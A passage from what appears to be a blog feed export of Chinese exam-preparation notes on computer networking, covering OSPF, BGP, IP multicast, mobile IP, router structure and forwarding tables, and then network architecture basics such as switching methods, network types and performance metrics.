<li>使用Dijkstra算法计算最优路径</li>
<li>划分区域<ul>
<li>减少洪泛法交换范围</li>
<li>区域边界路由器</li>
<li>主干区域</li>
<li>自治系统边界路由器</li>
</ul>
</li>
</ul>
</li>
<li>分组类型<ul>
<li>问候分组(发现和维持邻站可达性)</li>
<li>数据库描述分组(链路状态项目摘要)</li>
<li>链路状态请求分组(请求详细信息)</li>
<li>链路状态更新分组(全网更新链路状态)</li>
<li>链路状态确认分组(确认更新)</li>
</ul>
</li>
<li>操作流程<ul>
<li>每10秒交换问候分组</li>
<li>40秒未收到则认为不可达</li>
<li>初始工作流程<ul>
<li>通过问候分组发现相邻路由器</li>
<li>交换数据库描述分组</li>
<li>请求缺少的链路状态信息</li>
<li>建立同步链路数据库</li>
</ul>
</li>
<li>链路状态变化时<ul>
<li>使用洪泛法更新</li>
<li>其他路由器发送确认</li>
</ul>
</li>
<li>定期刷新(如30分钟)</li>
</ul>
</li>
</ul>
<h3 id="4-4-5-边界网关协议-BGP"><a href="#4-4-5-边界网关协议-BGP" class="headerlink" title="4.4.5   边界网关协议(BGP)"></a>4.4.5   边界网关协议(BGP)</h3><ul>
<li><p>BGP的基本特点</p>
<ul>
<li>边界网关协议(Border Gateway Protocol, BGP)<ul>
<li>不同自治系统(AS)的路由器之间交换路由信息的协议</li>
<li>属于外部网关协议</li>
<li>常用于互联网网关之间</li>
</ul>
</li>
<li>与其他协议对比<ul>
<li>RIP和OSPF只能在AS内工作</li>
<li>没有BGP时，全球AS会成为孤岛</li>
</ul>
</li>
<li>使用环境特点<ul>
<li>互联网规模太大导致AS间路由选择困难</li>
<li>AS间路由需考虑政治、安全、经济等因素</li>
</ul>
</li>
<li>协议特性<ul>
<li>力求找到可达且不兜圈子的路由(非最佳路由)</li>
<li>采用路径向量路由选择协议</li>
<li>是应用层协议，基于TCP</li>
</ul>
</li>
</ul>
</li>
<li><p>BGP会话</p>
<ul>
<li>两种BGP会话定义<ul>
<li>外部BGP(eBGP)会话<ul>
<li>跨越两个AS的BGP会话</li>
</ul>
</li>
<li>内部BGP(iBGP)会话<ul>
<li>同一AS内两个路由器之间的BGP会话</li>
</ul>
</li>
</ul>
</li>
<li>连接方式<ul>
<li>通过端口号179的半永久TCP连接</li>
<li>交换信息后仍保持连接状态</li>
</ul>
</li>
</ul>
</li>
<li><p>BGP路由</p>
<ul>
<li>路由格式<ul>
<li>&lt;CIDR前缀, BGP属性&gt;</li>
</ul>
</li>
<li>重要BGP属性<ul>
<li>AS-PATH(自治系统路径)<ul>
<li>记录路由经过的自治系统</li>
<li>使用ASN(自治系统号)标识</li>
</ul>
</li>
<li>NEXT-HOP(下一跳)<ul>
<li>通告的BGP路由起点</li>
</ul>
</li>
</ul>
</li>
<li>路由处理过程<ul>
<li>路由器收到BGP路由后需转换起点</li>
<li>利用内部网关协议找到最佳路由中的下一跳</li>
<li>在转发表中增加相应表项</li>
</ul>
</li>
</ul>
</li>
<li><p>BGP路由选择</p>
<ul>
<li>选择原则(按优先级顺序)<br>①. 本地偏好值最高的路由<br>②. AS跳数最少(AS-PATH最短)的路由<br>③. 热土豆路由选择算法<ul>
<li>选择最靠近NEXT-HOP路由器的路由</li>
<li>让分组最快离开本AS<br>④. BGP标识符数值最小的路由</li>
</ul>
</li>
</ul>
</li>
<li><p>BGP的四种报文</p>
<ul>
<li>Open(打开)报文<ul>
<li>建立BGP对等方关系</li>
<li>初始化通信</li>
</ul>
</li>
<li>Update(更新)报文<ul>
<li>通知路由信息</li>
<li>列出要撤销的路由</li>
<li>每次只能增加一条新路由</li>
</ul>
</li>
<li>Keepalive(保活)报文<ul>
<li>周期性确认邻站连通性</li>
<li>19字节大小</li>
</ul>
</li>
<li>Notification(通知)报文<ul>
<li>发送检测到的差错</li>
</ul>
</li>
</ul>
</li>
<li><p>三种路由协议比较</p>
<ul>
<li>RIP<ul>
<li>类型: 内部</li>
<li>路由算法: 距离向量</li>
<li>传递协议: UDP</li>
<li>路径选择: 跳数最少</li>
<li>交换节点: 相邻路由器</li>
<li>交换内容: 整个路由表</li>
</ul>
</li>
<li>OSPF<ul>
<li>类型: 内部</li>
<li>路由算法: 链路状态</li>
<li>传递协议: IP</li>
<li>路径选择: 代价最低</li>
<li>交换节点: 网络中所有路由器</li>
<li>交换内容: 相邻路由器链路状态</li>
</ul>
</li>
<li>BGP<ul>
<li>类型: 外部</li>
<li>路由算法: 路径向量</li>
<li>传递协议: TCP</li>
<li>路径选择: 较好(非最佳)</li>
<li>交换节点: 相邻路由器</li>
<li>交换内容: <ul>
<li>首次: 整个路由表</li>
<li>非首次: 有变化的部分</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="4-5-IP多播"><a href="#4-5-IP多播" class="headerlink" title="4.5   IP多播"></a>4.5   IP多播</h2><h3 id="4-5-1-多播的概念"><a href="#4-5-1-多播的概念" class="headerlink" title="4.5.1   多播的概念"></a>4.5.1   多播的概念</h3><ul>
<li>定义<ul>
<li>让源主机一次发送的单个分组可以抵达用一个组地址标识的若干目的主机</li>
<li>一对多的通信</li>
<li>在互联网上进行的多播称为IP多播</li>
</ul>
</li>
<li>优势<ul>
<li>与单播相比<ul>
<li>大大节约网络资源</li>
<li>示例：视频服务器向90台主机传送同样的视频节目<ul>
<li>单播：需要发送90次</li>
<li>多播：仅发送一份数据，只需发送一次</li>
</ul>
</li>
</ul>
</li>
<li>技术特点<ul>
<li>传送路径出现分岔时才将分组复制后继续转发</li>
<li>大大减轻发送者负担和网络负载</li>
</ul>
</li>
</ul>
</li>
<li>实现要求<ul>
<li>需要路由器支持</li>
<li>能够运行多播协议的路由器称为多播路由器</li>
</ul>
</li>
</ul>
<h3 id="4-5-2-IP多播地址"><a href="#4-5-2-IP多播地址" class="headerlink" title="4.5.2   IP多播地址"></a>4.5.2   IP多播地址</h3><ul>
<li><p>多播数据报特点</p>
<ul>
<li>源地址：源主机的IP地址</li>
<li>目的地址：IP多播地址（D类地址）</li>
</ul>
</li>
<li><p>D类地址范围</p>
<ul>
<li>前四位：1110</li>
<li>范围：224.0.0.0~239.255.255.255</li>
</ul>
</li>
<li><p>多播组</p>
<ul>
<li>每个D类IP地址标志一个多播组</li>
<li>主机可随时加入或离开多播组</li>
</ul>
</li>
<li><p>多播数据报与普通IP数据报的区别</p>
<ul>
<li>目的地址：使用D类IP地址</li>
<li>协议字段值：2（表示使用IGMP）</li>
</ul>
</li>
</ul>
<h3 id="4-5-3-在局域网上进行硬件多播"><a href="#4-5-3-在局域网上进行硬件多播" class="headerlink" title="4.5.3    在局域网上进行硬件多播"></a>4.5.3    在局域网上进行硬件多播</h3><ul>
<li>局域网支持硬件多播<ul>
<li>实现方式：将IP多播地址映射成多播MAC地址<ul>
<li>将IP多播数据报封装在MAC帧中</li>
<li>MAC帧目的地址设置为映射后的多播MAC地址</li>
</ul>
</li>
</ul>
</li>
<li>IANA分配的以太网多播地址范围<ul>
<li>01-00-5E-00-00-00 到 01-00-5E-7F-FF-FF</li>
<li>可用位数<ul>
<li>总长度：48位</li>
<li>可用部分：后23位</li>
</ul>
</li>
</ul>
</li>
<li>D类IP地址与以太网地址映射关系<ul>
<li>D类IP地址可用位数：28位</li>
<li>映射特点<ul>
<li>前5位无法映射到以太网地址</li>
<li>结果：多对一映射关系</li>
</ul>
</li>
</ul>
</li>
<li>接收端处理<ul>
<li>需要IP层软件过滤<ul>
<li>原因：多对一映射导致地址冲突</li>
<li>处理方式：丢弃非目标主机的数据报</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="4-5-4-IGMP-与多播路由协议"><a href="#4-5-4-IGMP-与多播路由协议" class="headerlink" title="4.5.4   IGMP 与多播路由协议"></a>4.5.4   IGMP 与多播路由协议</h3><ul>
<li>IGMP协议<ul>
<li>作用: 让多播路由器获知局域网内主机加入&#x2F;退出多播组</li>
<li>特点<ul>
<li>不管理互联网范围内的多播组成员</li>
<li>不知道组成员数量和分布</li>
</ul>
</li>
<li>报文封装: 封装在IP数据报中传送</li>
<li>工作阶段<ul>
<li>第一阶段: 主机加入时发送IGMP报文</li>
<li>第二阶段: 周期性探询组成员状态</li>
</ul>
</li>
</ul>
</li>
<li>多播路由协议<ul>
<li>目的: 最小代价传送多播数据报给所有组成员</li>
<li>多播转发树<ul>
<li>以源主机为根节点</li>
<li>每个分组在每条链路上只传送一次</li>
<li>不同多播组对应不同转发树</li>
<li>同一多播组对不同源点有不同转发树</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="4-6-移动IP"><a href="#4-6-移动IP" class="headerlink" title="4.6   移动IP"></a>4.6   移动IP</h2><h3 id="4-6-1-移动IP-的概念"><a href="#4-6-1-移动IP-的概念" class="headerlink" title="4.6.1   移动IP 的概念"></a>4.6.1   移动IP 的概念</h3><ul>
<li>移动IP技术<ul>
<li>定义<ul>
<li>移动站以固定的IP地址实现跨越不同网络的漫游功能</li>
</ul>
</li>
<li>目标<ul>
<li>把分组自动地投递给移动站</li>
</ul>
</li>
<li>移动站定义<ul>
<li>把其连接点从一个网络或子网改变到另一个网络或子网的主机</li>
</ul>
</li>
</ul>
</li>
<li>功能实体<ul>
<li>移动节点<ul>
<li>具有永久IP地址的移动主机</li>
</ul>
</li>
<li>本地代理<ul>
<li>通常就是连接在归属网络上的路由器</li>
</ul>
</li>
<li>外地代理<ul>
<li>通常就是连接在被访网络上的路由器</li>
</ul>
</li>
</ul>
</li>
<li>注意事项<ul>
<li>通过DHCP自动获取新IP地址不是移动IP</li>
<li>移动IP需要保持TCP连接不中断</li>
<li>移动IP要求IP地址在移动中保持不变</li>
</ul>
</li>
</ul>
<h3 id="4-6-2-移-动IP-通信过程"><a href="#4-6-2-移-动IP-通信过程" class="headerlink" title="4.6.2   移 动IP 通信过程"></a>4.6.2   移 动IP 通信过程</h3><ul>
<li>移动IP原理类比<ul>
<li>本科毕业通信例子<ul>
<li>留下家庭地址(永久地址)</li>
<li>家长转交信件</li>
</ul>
</li>
</ul>
</li>
<li>基本概念<ul>
<li>移动站永久地址(归属地址)</li>
<li>归属网络<ul>
<li>例:移动站A永久地址131.8.6.7&#x2F;16</li>
<li>归属网络131.8.0.0&#x2F;16</li>
</ul>
</li>
<li>归属代理<ul>
<li>连接归属网络的路由器</li>
<li>应用层功能</li>
</ul>
</li>
<li>被访网络<ul>
<li>例:15.0.0.0&#x2F;8</li>
</ul>
</li>
<li>外地代理<ul>
<li>连接被访网络的路由器</li>
<li>功能<ul>
<li>创建转交地址<ul>
<li>例:15.5.6.7&#x2F;8</li>
</ul>
</li>
<li>通知归属代理转交地址</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>通信流程<ul>
<li>1)移动站在归属网络<ul>
<li>传统TCP&#x2F;IP通信</li>
</ul>
</li>
<li>2)漫游到被访网络<ul>
<li>外地代理登记获取转交地址</li>
<li>外地代理向归属代理登记</li>
</ul>
</li>
<li>3)归属代理操作<ul>
<li>构建通向转交地址隧道</li>
<li>封装并转发IP分组</li>
</ul>
</li>
<li>4)外地代理操作<ul>
<li>拆封恢复原始IP分组</li>
<li>发送给移动站</li>
</ul>
</li>
<li>5)移动站发送IP分组<ul>
<li>使用永久地址作为源地址</li>
<li>直接通过外地代理</li>
</ul>
</li>
<li>6)移动到新被访网络<ul>
<li>新外地代理登记</li>
<li>更新归属代理转交地址</li>
</ul>
</li>
<li>7)返回归属网络<ul>
<li>注销转交地址</li>
</ul>
</li>
</ul>
</li>
<li>支持移动性的新功能<ul>
<li>移动站到外地代理登记协议</li>
<li>外地代理到归属代理登记协议</li>
<li>归属代理数据报封装协议</li>
<li>外地代理拆封协议</li>
</ul>
</li>
</ul>
<h2 id="4-7-网络层设备"><a href="#4-7-网络层设备" class="headerlink" title="4.7   网络层设备"></a>4.7   网络层设备</h2><h3 id="4-7-1-冲突域和广播域"><a href="#4-7-1-冲突域和广播域" class="headerlink" title="4.7.1   冲突域和广播域"></a>4.7.1   冲突域和广播域</h3><ul>
<li>①. 冲突域<ul>
<li>定义<ul>
<li>连接到同一物理介质上的所有节点的集合</li>
<li>这些节点之间存在介质争用的现象</li>
</ul>
</li>
<li>OSI层次<ul>
<li>第1层概念</li>
</ul>
</li>
<li>设备影响<ul>
<li>不能划分冲突域的设备<ul>
<li>集线器</li>
<li>中继器等第1层设备</li>
</ul>
</li>
<li>可以划分冲突域的设备<ul>
<li>第2层设备<ul>
<li>网桥</li>
<li>交换机</li>
</ul>
</li>
<li>第3层设备<ul>
<li>路由器</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>②. 广播域<ul>
<li>定义<ul>
<li>接收同样广播消息的节点集合</li>
</ul>
</li>
<li>OSI层次<ul>
<li>第2层概念</li>
</ul>
</li>
<li>设备影响<ul>
<li>属于同一广播域的设备<ul>
<li>第1层设备<ul>
<li>集线器等</li>
</ul>
</li>
<li>第2层设备<ul>
<li>交换机等</li>
</ul>
</li>
</ul>
</li>
<li>可以划分广播域的设备<ul>
<li>路由器（第3层设备）</li>
</ul>
</li>
</ul>
</li>
<li>局域网(LAN)定义<ul>
<li>特指使用路由器分割的网络</li>
<li>也就是广播域</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="4-7-2-路由器的组成和功能"><a href="#4-7-2-路由器的组成和功能" class="headerlink" title="4.7.2    路由器的组成和功能"></a>4.7.2    路由器的组成和功能</h3><ul>
<li>路由器定义<ul>
<li>具有多个输入&#x2F;输出端口的专用计算机</li>
<li>任务：连接不同网络并完成分组转发</li>
</ul>
</li>
<li>网络连接特性<ul>
<li>连接异构网络</li>
<li>多个逻辑网络互连时必须使用</li>
<li>隔离广播域</li>
</ul>
</li>
<li>数据转发原理<ul>
<li>同网络通信：直接交付</li>
<li>跨网络通信：间接交付（通过路由器）</li>
<li>连接能力<ul>
<li>不同LAN</li>
<li>不同VLAN</li>
<li>不同WAN</li>
<li>LAN和WAN互连</li>
</ul>
</li>
</ul>
</li>
<li>结构组成<ul>
<li>路由选择部分（控制部分）<ul>
<li>核心构件：路由选择处理机</li>
<li>功能<ul>
<li>构造路由表</li>
<li>更新维护路由表</li>
</ul>
</li>
</ul>
</li>
<li>分组转发部分<ul>
<li>交换结构（交换组织）<ul>
<li>根据转发表处理分组</li>
</ul>
</li>
<li>输入端口组</li>
<li>输出端口组</li>
</ul>
</li>
</ul>
</li>
<li>层次实现<ul>
<li>实现网络模型下三层<ul>
<li>物理层</li>
<li>数据链路层</li>
<li>网络层</li>
</ul>
</li>
</ul>
</li>
<li>端口处理机制<ul>
<li>输入端口处理流程<ul>
<li>物理层：接收比特流</li>
<li>数据链路层：提取帧</li>
<li>网络层：处理分组</li>
</ul>
</li>
<li>输出端口处理流程（反向操作）</li>
<li>缓冲队列<ul>
<li>暂存分组</li>
<li>进行差错检测</li>
<li>可能发生缓冲区溢出</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="4-7-3-路由表与分组转发"><a href="#4-7-3-路由表与分组转发" class="headerlink" title="4.7.3   路由表与分组转发"></a>4.7.3   路由表与分组转发</h3><ul>
<li>路由表<ul>
<li>根据路由选择算法得出</li>
<li>主要用途是路由选择</li>
<li>标准路由表项目<ul>
<li>目的网络IP地址</li>
<li>子网掩码</li>
<li>下一跳IP地址</li>
<li>接口</li>
</ul>
</li>
</ul>
</li>
<li>转发表<ul>
<li>从路由表得出</li>
<li>表项与路由表项对应关系<ul>
<li>图4.27 转发表的示例</li>
</ul>
</li>
<li>格式与路由表不同<ul>
<li>结构优化查找过程</li>
</ul>
</li>
<li>内容<ul>
<li>分组发往的目的网络</li>
<li>分组的下一跳(MAC地址)</li>
<li>可设置默认路由<ul>
<li>匹配优先级最低</li>
</ul>
</li>
</ul>
</li>
<li>实现方式<ul>
<li>软件实现</li>
<li>特殊硬件实现</li>
</ul>
</li>
</ul>
</li>
<li>转发与路由选择的区别<ul>
<li>转发<ul>
<li>单个路由器行为</li>
<li>根据转发表转发IP数据报</li>
</ul>
</li>
<li>路由选择<ul>
<li>多个路由器协同</li>
<li>使用复杂路由算法</li>
<li>根据网络拓扑变化动态调整</li>
<li>构造整个路由表</li>
</ul>
</li>
</ul>
</li>
<li>关键区别<ul>
<li>路由表≠转发表</li>
<li>分组实际转发<ul>
<li>直接查找转发表</li>
<li>不查找路由表</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>408</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>网络层</tag>
      </tags>
  </entry>
  <entry>
    <title>第 1 章 计算机网络体系结构</title>
    <url>/2025/12/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h2 id="1-1-计算机网络概述"><a href="#1-1-计算机网络概述" class="headerlink" title="1.1   计算机网络概述"></a>1.1   计算机网络概述</h2><h3 id="1-1-1-计算机网络的概念"><a href="#1-1-1-计算机网络的概念" class="headerlink" title="1.1.1   计算机网络的概念"></a>1.1.1   计算机网络的概念</h3><ul>
<li>计算机网络的概念<ul>
<li>定义<ul>
<li>将众多分散的、自治的计算机系统，通过通信设备与线路连接起来</li>
<li>由功能完善的软件实现资源共享和信息传递的系统</li>
</ul>
</li>
<li>组成<ul>
<li>节点(Node)<ul>
<li>计算机</li>
<li>集线器</li>
<li>交换机</li>
<li>路由器</li>
</ul>
</li>
<li>链路(Link)</li>
</ul>
</li>
<li>互连网(internet)<ul>
<li>网络之间通过路由器互连</li>
<li>构成覆盖范围更广的计算机网络</li>
</ul>
</li>
<li>名词区分<ul>
<li>internet(互连网)<ul>
<li>通用名词</li>
<li>多个计算机网络互连而成</li>
<li>可使用任意通信协议</li>
</ul>
</li>
<li>Internet(互联网&#x2F;因特网)<ul>
<li>专用名词</li>
<li>全球最大、开放的特定计算机网络</li>
<li>采用TCP&#x2F;IP族作为通信规则</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="1-1-2-计算机网络的组成"><a href="#1-1-2-计算机网络的组成" class="headerlink" title="1.1.2   计算机网络的组成"></a>1.1.2   计算机网络的组成</h3><ul>
<li>从组成部分看<ul>
<li>硬件<ul>
<li>主机(端系统)</li>
<li>通信链路<ul>
<li>双绞线</li>
<li>光纤</li>
</ul>
</li>
<li>交换设备<ul>
<li>路由器</li>
<li>交换机</li>
</ul>
</li>
<li>通信处理机<ul>
<li>网卡</li>
</ul>
</li>
</ul>
</li>
<li>软件<ul>
<li>资源共享软件</li>
<li>工具软件<ul>
<li>E-mail程序</li>
<li>FTP程序</li>
<li>聊天程序</li>
</ul>
</li>
</ul>
</li>
<li>协议<ul>
<li>网络传输数据规范</li>
</ul>
</li>
</ul>
</li>
<li>从工作方式看(Internet)<ul>
<li>边缘部分<ul>
<li>用户直接使用的主机</li>
<li>功能<ul>
<li>通信<ul>
<li>数据传输</li>
<li>音频&#x2F;视频</li>
</ul>
</li>
<li>资源共享</li>
</ul>
</li>
</ul>
</li>
<li>核心部分<ul>
<li>网络和路由器</li>
<li>功能<ul>
<li>提供连通性</li>
<li>交换服务</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>从功能组成看<ul>
<li>通信子网<ul>
<li>组成<ul>
<li>传输介质</li>
<li>通信设备</li>
<li>网络协议</li>
</ul>
</li>
<li>功能<ul>
<li>数据传输</li>
<li>交换</li>
<li>控制</li>
<li>存储</li>
</ul>
</li>
</ul>
</li>
<li>资源子网<ul>
<li>组成<ul>
<li>资源共享设备</li>
<li>软件</li>
</ul>
</li>
<li>功能<ul>
<li>提供硬件资源共享服务</li>
<li>提供软件资源共享服务</li>
<li>提供数据资源共享服务</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="1-1-3-计算机网络的功能"><a href="#1-1-3-计算机网络的功能" class="headerlink" title="1.1.3    计算机网络的功能"></a>1.1.3    计算机网络的功能</h3><ul>
<li>数据通信<ul>
<li>最基本和最重要的功能</li>
<li>实现联网计算机之间各种信息的传输</li>
<li>应用示例<ul>
<li>文件传输</li>
<li>电子邮件</li>
</ul>
</li>
</ul>
</li>
<li>资源共享<ul>
<li>共享类型<ul>
<li>软件共享</li>
<li>数据共享</li>
<li>硬件共享</li>
</ul>
</li>
<li>优势<ul>
<li>互通有无、分工协作</li>
<li>提高资源利用率</li>
</ul>
</li>
</ul>
</li>
<li>分布式处理<ul>
<li>定义<ul>
<li>将复杂任务分配给网络中空闲计算机</li>
</ul>
</li>
<li>优势<ul>
<li>提高系统利用率</li>
</ul>
</li>
</ul>
</li>
<li>提高可靠性<ul>
<li>定义<ul>
<li>各台计算机互为替代机</li>
</ul>
</li>
</ul>
</li>
<li>负载均衡<ul>
<li>定义<ul>
<li>均衡分配工作任务给各台计算机</li>
</ul>
</li>
</ul>
</li>
<li>其他功能<ul>
<li>电子化办公与服务</li>
<li>远程教育</li>
<li>娱乐功能</li>
<li>社会效益<ul>
<li>满足社会需求</li>
<li>方便学习、工作和生活</li>
<li>巨大经济效益</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="1-1-4-电路交换、报文交换与分组交换"><a href="#1-1-4-电路交换、报文交换与分组交换" class="headerlink" title="1.1.4    电路交换、报文交换与分组交换"></a>1.1.4    电路交换、报文交换与分组交换</h3><ul>
<li>电路交换<ul>
<li>特点<ul>
<li>建立连接、传输数据、释放连接</li>
<li>物理通信路径独占</li>
</ul>
</li>
<li>优点<ul>
<li>通信时延小</li>
<li>有序传输</li>
<li>没有冲突</li>
<li>实时性强</li>
</ul>
</li>
<li>缺点<ul>
<li>建立连接时间长</li>
<li>线路利用率低</li>
<li>灵活性差</li>
<li>难以实现差错控制</li>
</ul>
</li>
</ul>
</li>
<li>报文交换<ul>
<li>特点<ul>
<li>存储转发技术</li>
<li>报文为单位传输</li>
</ul>
</li>
<li>优点<ul>
<li>无建立连接时延</li>
<li>灵活分配线路</li>
<li>线路利用率高</li>
<li>支持差错控制</li>
</ul>
</li>
<li>缺点<ul>
<li>转发时延高</li>
<li>缓存开销大</li>
<li>错误处理低效</li>
</ul>
</li>
</ul>
</li>
<li>分组交换<ul>
<li>特点<ul>
<li>存储转发技术</li>
<li>将报文划分为分组</li>
</ul>
</li>
<li>优点<ul>
<li>方便存储管理</li>
<li>传输效率高</li>
<li>减少出错概率和重传代价</li>
</ul>
</li>
<li>缺点<ul>
<li>存在存储转发时延</li>
<li>需要传输额外信息量</li>
<li>可能出现失序、丢失或重复分组</li>
</ul>
</li>
</ul>
</li>
<li>三种交换方式比较<ul>
<li>电路交换适合连续大量数据传输</li>
<li>报文交换和分组交换信道利用率更高</li>
<li>分组交换更适合突发式数据传送</li>
</ul>
</li>
</ul>
<h3 id="1-1-5-计算机网络的分类"><a href="#1-1-5-计算机网络的分类" class="headerlink" title="1.1.5    计算机网络的分类"></a>1.1.5    计算机网络的分类</h3><ul>
<li>按分布范围分类<ul>
<li>广域网 (WAN)<ul>
<li>任务: 提供长距离通信</li>
<li>覆盖范围: 几十米到几千千米</li>
<li>特点: 互联网核心部分, 高速链路</li>
</ul>
</li>
<li>城域网 (MAN)<ul>
<li>覆盖范围: 5～50km</li>
<li>技术: 以太网技术</li>
</ul>
</li>
<li>局域网 (LAN)<ul>
<li>覆盖范围: 几十到几千米</li>
<li>特点: 主机高速线路相连, 广播技术</li>
</ul>
</li>
<li>个人区域网 (PAN)<ul>
<li>定义: 个人电子设备无线连接</li>
<li>别名: 无线个人区域网 (WPAN)</li>
</ul>
</li>
</ul>
</li>
<li>按传输技术分类<ul>
<li>广播式网络<ul>
<li>特点: 共享公共通信信道</li>
<li>应用: 局域网, 无线&#x2F;卫星通信</li>
</ul>
</li>
<li>点对点网络<ul>
<li>特点: 物理线路连接一对计算机</li>
<li>传输方式: 存储转发</li>
</ul>
</li>
</ul>
</li>
<li>按拓扑结构分类<ul>
<li>总线形网络<ul>
<li>特点: 单根传输线连接</li>
<li>优点: 建网容易, 节省线路</li>
<li>缺点: 重负载效率低</li>
</ul>
</li>
<li>星形网络<ul>
<li>特点: 单独线路连接中央设备</li>
<li>优点: 便于集中控制</li>
<li>缺点: 成本高</li>
</ul>
</li>
<li>环形网络<ul>
<li>特点: 接口设备连接成环</li>
<li>例子: 令牌环局域网</li>
</ul>
</li>
<li>网状网络<ul>
<li>特点: 每个节点多条路径</li>
<li>应用: 广域网</li>
<li>优点: 可靠性高</li>
<li>缺点: 控制复杂</li>
</ul>
</li>
</ul>
</li>
<li>按使用者分类<ul>
<li>公用网 (Public Network)<ul>
<li>特点: 电信公司建造, 付费使用</li>
</ul>
</li>
<li>专用网 (Private Network)<ul>
<li>特点: 单位专用, 不对外开放</li>
</ul>
</li>
</ul>
</li>
<li>按传输介质分类<ul>
<li>有线网络<ul>
<li>类型<ul>
<li>双绞线</li>
<li>同轴电缆</li>
</ul>
</li>
</ul>
</li>
<li>无线网络<ul>
<li>类型<ul>
<li>蓝牙</li>
<li>微波</li>
<li>无线电</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="1-1-6-计算机网络的性能指标"><a href="#1-1-6-计算机网络的性能指标" class="headerlink" title="1.1.6    计算机网络的性能指标"></a>1.1.6    计算机网络的性能指标</h3><ul>
<li>1)速率 (Speed)<ul>
<li>定义:节点在数字信道上传送数据的速率</li>
<li>别名:数据传输速率&#x2F;数据率&#x2F;比特率</li>
<li>单位:b&#x2F;s(bit&#x2F;s&#x2F;bps)</li>
<li>高数据率表示:kb&#x2F;s(10³)&#x2F;Mb&#x2F;s(10⁶)&#x2F;Gb&#x2F;s(10⁹)</li>
</ul>
</li>
<li>2)带宽(Bandwidth)<ul>
<li>原义:通信线路允许通过的信号频率范围(Hz)</li>
<li>网络定义:通信线路传送数据的能力(最高数据传输速率)</li>
<li>单位:b&#x2F;s</li>
</ul>
</li>
<li>3)吞吐量(Throughput)<ul>
<li>定义:单位时间通过网络的实际数据量</li>
<li>用途:实际网络测量</li>
</ul>
</li>
<li>4)时延(Delay)<ul>
<li>定义:数据从网络一端传送到另一端的总时间</li>
<li>组成:<ul>
<li>发送时延(传输时延)<ul>
<li>公式:分组长度&#x2F;发送速率</li>
</ul>
</li>
<li>传播时延<ul>
<li>公式:信道长度&#x2F;电磁波传播速率</li>
</ul>
</li>
<li>处理时延</li>
<li>排队时延</li>
</ul>
</li>
<li>总时延公式:发送+传播+处理+排队</li>
</ul>
</li>
<li>5)时延带宽积<ul>
<li>定义:传播时延×信道带宽</li>
<li>物理意义:链路可容纳的比特数量</li>
</ul>
</li>
<li>6)往返时延(RTT)<ul>
<li>定义:发送分组到收到确认的总时间</li>
<li>包含:中间节点处理&#x2F;排队&#x2F;发送时延</li>
</ul>
</li>
<li>7)信道利用率<ul>
<li>定义:信道有数据通过的时间百分比</li>
<li>公式:有数据时间&#x2F;(有数据+无数据时间)</li>
<li>注意事项:过高会导致时延增大</li>
</ul>
</li>
</ul>
<h2 id="1-2-计算机网络体系结构与参考模型"><a href="#1-2-计算机网络体系结构与参考模型" class="headerlink" title="1.2   计算机网络体系结构与参考模型"></a>1.2   计算机网络体系结构与参考模型</h2><h3 id="1-2-1-计算机网络分层结构"><a href="#1-2-1-计算机网络分层结构" class="headerlink" title="1.2.1    计算机网络分层结构"></a>1.2.1    计算机网络分层结构</h3><ul>
<li>网络体系结构的定义<ul>
<li>计算机网络的各层及其协议的集合称为网络的体系结构</li>
<li>体系结构是抽象的，实现是具体的</li>
</ul>
</li>
<li>分层的基本原则<ul>
<li>1)每层实现相对独立的功能</li>
<li>2)各层接口清晰，交流少</li>
<li>3)功能定义独立于实现方法</li>
<li>4)下层对上层的独立性</li>
<li>5)促进标准化工作</li>
</ul>
</li>
<li>分层结构中的概念<ul>
<li>实体<ul>
<li>第n层的活动元素</li>
<li>对等层和对等实体</li>
</ul>
</li>
<li>服务关系<ul>
<li>第n层向第n+1层提供服务</li>
<li>服务提供者与服务用户</li>
</ul>
</li>
</ul>
</li>
<li>数据单元<ul>
<li>协议数据单元(PDU)<ul>
<li>n-PDU &#x3D; n-SDU + n-PCI</li>
<li>各层PDU名称<ul>
<li>物理层：比特流</li>
<li>数据链路层：帧</li>
<li>网络层：分组</li>
<li>传输层：报文段</li>
</ul>
</li>
</ul>
</li>
<li>服务数据单元(SDU)</li>
<li>协议控制信息(PCI)</li>
</ul>
</li>
<li>层次结构的含义<ul>
<li>1)第n层使用n-1层服务，并向n+1层提供服务</li>
<li>2)最低层只提供服务，最高层面向用户</li>
<li>3)上层只能通过相邻层接口使用下层服务</li>
<li>4)对等层在逻辑上有直接信道</li>
</ul>
</li>
</ul>
<h3 id="1-2-2-计算机网络协议、接口、服务的概念"><a href="#1-2-2-计算机网络协议、接口、服务的概念" class="headerlink" title="1.2.2    计算机网络协议、接口、服务的概念"></a>1.2.2    计算机网络协议、接口、服务的概念</h3><ul>
<li>协议<ul>
<li>定义<ul>
<li>控制对等实体之间通信的规则的集合</li>
<li>是水平的</li>
</ul>
</li>
<li>组成<ul>
<li>语法<ul>
<li>数据与控制信息的格式</li>
</ul>
</li>
<li>语义<ul>
<li>需要发出何种控制信息、完成何种动作及做出何种应答</li>
</ul>
</li>
<li>同步(时序)<ul>
<li>执行各种操作的条件、时序关系</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>接口<ul>
<li>定义<ul>
<li>同一节点内相邻两层实体交换信息的逻辑接口(SAP)</li>
</ul>
</li>
<li>特点<ul>
<li>只能在紧邻层之间定义</li>
<li>第n层SAP是第n+1层访问第n层服务的入口</li>
</ul>
</li>
</ul>
</li>
<li>服务<ul>
<li>定义<ul>
<li>下层为紧邻上层提供的功能调用</li>
<li>是垂直的</li>
</ul>
